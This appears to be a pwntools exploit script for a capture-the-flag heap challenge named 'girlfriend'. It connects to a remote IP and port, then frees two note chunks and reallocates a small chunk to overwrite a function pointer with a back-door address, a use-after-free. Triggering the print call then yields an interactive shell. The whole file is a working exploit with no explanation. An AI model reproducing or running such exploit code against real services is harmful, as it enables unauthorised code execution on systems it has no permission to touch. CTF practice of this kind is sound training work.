from pwn import *
# context(log_level='debug',arch='amd64',os='linux',terminal=['tmux','splitw','-h'])


# io=process("./girlfriend")
io=remote("43.143.7.127",28184)
elf=ELF("./girlfriend")
libc=ELF("./libc-2.23.so")


back_door=0x400b9c
def add(n,c):
    io.recvuntil("choice :")
    io.send(b"1")
    io.recvuntil("size is :")
    io.send(str(n))
    io.recvuntil("name is :")
    io.send(c)

def delete(n):
    io.recvuntil("choice :")
    io.send(b"2")
    io.recvuntil("Index :")
    io.sendline(str(n))

def print_one(n):
    io.recvuntil("choice :")
    io.send(b"3")
    io.recvuntil("Index :")
    io.sendline(str(n))

add(0x40,cyclic(0x40))  #0
add(0x40,cyclic(0x40))  #1

delete(0)
delete(1)

add(0x8,p64(back_door))

# gdb.attach(io)
# pause()

print_one(0)

io.interactive()